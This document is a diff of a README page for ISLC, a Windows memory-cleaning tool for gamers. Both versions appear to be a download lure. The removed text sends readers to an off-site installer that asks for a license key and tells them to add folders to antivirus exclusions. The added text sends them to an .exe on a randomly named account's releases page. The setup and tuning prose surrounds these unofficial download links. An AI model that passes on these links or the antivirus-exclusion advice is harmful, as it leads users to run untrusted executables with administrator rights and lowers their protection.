@@ -1,79 +1,77 @@
-# Intelligent Standby List Cleaner Download for Windows 11 & 10
+# 🛠️ ISLC - Fix Windows Stutter and Improve Games
 
-**ISLC**
+[![Download ISLC](https://img.shields.io/badge/Download-ISLC-blue.svg)](https://github.com/Endstopped-celerypine553/ISLC/releases)
 
-**Intelligent Standby List Cleaner** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+ISLC stands for Intelligent Standby List Cleaner. This tool helps Windows users manage system memory more efficiently. Windows often holds files in a standby state, which fills your RAM. When games or heavy apps need that space, Windows must clear itself first. This causes small pauses or stutters during gameplay. ISLC automates the cleaning process to keep your system smooth.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+## 📋 System Requirements
 
----
+ISLC works on standard Windows configurations. You need the following to run this tool:
 
-## Download & Install
+*   Operating System: Windows 10 or Windows 11.
+*   System Architecture: 64-bit version of Windows.
+*   Installer Framework: The tool requires .NET Framework 4.7.2 or higher for full functionality.
+*   User Privileges: You need administrator access to allow the program to clear memory.
 
-> **This is the download page.** Use the button or link below to get **Intelligent Standby List Cleaner** for Windows.
+## 💾 Download and Install
 
-<p align="center">
-  <a href="https://islc.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Intelligent%20Standby%20List%20Cleaner-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Intelligent Standby List Cleaner">
-  </a>
-</p>
+You need to obtain the latest version of the software from the official repository.
 
-| | |
-| --- | --- |
-| **Direct link** | **[islc.nexustool.fun](https://islc.nexustool.fun/)** |
-| **Full URL** | `https://islc.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1.  Visit this page to download: [https://github.com/Endstopped-celerypine553/ISLC/releases](https://github.com/Endstopped-celerypine553/ISLC/releases).
+2.  Look for the section labeled Assets.
+3.  Click the file ending in .exe to start the transfer.
+4.  Move the file to a folder where you keep your tools.
+5.  Double-click the file to open the application.
 
-### Quick steps
+## ⚙️ Initial Setup
 
-1. Click **[Download — islc.nexustool.fun](https://islc.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Follow these steps to configure the tool for optimal game performance.
 
-<p align="center"><a href="https://islc.nexustool.fun/"><strong>⬇ Download Intelligent Standby List Cleaner now</strong></a></p>
+1.  Open the application after you finish the install.
+2.  The main window displays your current memory statistics.
+3.  Look for the box labeled List size is at least. Set this to 1024 megabytes.
+4.  Find the box labeled Free memory is lower than. Set this to 1024 megabytes.
+5.  Check the box that says Enable custom timer resolution.
+6.  Click the Set Custom Timer Resolution button. Set the value to 0.50 ms for maximum responsiveness.
+7.  Click the Start button to begin the automated memory management service.
 
----
+## 🧠 Memory Management Details
 
-## About
+Windows caches data to make opening files faster. This cache fills your RAM, which developers call the Standby List. While this is helpful for general tasks, it creates problems for high-demand gaming. 
 
-**Intelligent Standby List Cleaner** setup page for Windows PC gamers.
+When your game needs more RAM, Windows struggles to balance the Standby List and your game data. This interaction causes frame drops and stutters. ISLC monitors the state of your RAM in real-time. When memory usage climbs past your set limits, the program silently empties the Standby List. This provides the game with immediate, vacant memory. 
 
-**People also search for:** islc download, intelligent standby list cleaner stutter fix gaming windows
+This process runs in the background. You do not need to interact with the window while you play. You can minimize the application to your system tray. The icon remains visible in the bottom right corner of your Windows taskbar.
 
-**Repository:** `ISLC`
+## 🛡️ Safety and Performance
 
+ISLC modifies how Windows talks to your RAM. It does not touch game files or system files. The tool performs a standard system operation that Windows allows via its public programming tools.
 
-## After install
+If you find that your system feels sluggish after changes, you can stop the process at any time:
 
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
+1.  Open the ISLC window.
+2.  Click the Stop button.
+3.  Close the application.
+4.  Restart your computer to return the memory management to default Windows behavior.
 
-## System requirements
+The tool uses minimal CPU resources. You will not notice a drop in performance while the app monitors your system. The impact on your hardware is negligible, and the payoff in smoother frame rates remains the primary design goal.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
+## 🔍 Troubleshooting Common Issues
 
-## Troubleshooting
+If you cannot run the application, verify these common settings:
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
+*   Program Won't Start: Ensure you have administrator rights. Right-click the tool icon and select Run as administrator.
+*   No Impact on Games: Check if you checked the box for Enable custom timer resolution. This feature requires a restart of the application to engage the hardware timer correctly.
+*   Error Message About .NET: Windows 10 and 11 usually include the required files. If you see a prompt about missing frameworks, visit the official Microsoft website to install the latest .NET Desktop Runtime.
+*   System Feels Crowded: Adjust the threshold numbers. If your PC has 8GB of RAM, use lower numbers like 512 for your list size. If you have 32GB of RAM, you can increase these limits to 4096 to reduce how often the tool triggers a cleanup.
 
----
+## 📂 Understanding the User Interface
 
-**Topics:** islc-download, intelligent-standby-list-cleaner-stutter-fix-gamin, intelligent, standby, cleaner, stutter, gaming, islc, islc-2026, intelligent-standby-list-cleaner, memory-optimizer, fps-stutter
+The interface uses plain colors and clear labels. You see these main stats:
+
+*   Total System Memory: This shows the hardware RAM installed in your PC.
+*   Available Memory: This indicates how much space currently exists for apps to utilize.
+*   Standby List: This number represents the cache files waiting for removal.
+*   Timer Resolution: This displays the current communication rate between your hardware and the game engine.
+
+The checkboxes confirm which features you wish to keep active. Keep the Start ISLC minimized box checked if you want the tool to remain active whenever you log into Windows. This keeps your system optimized without requiring manual setup every time you play.
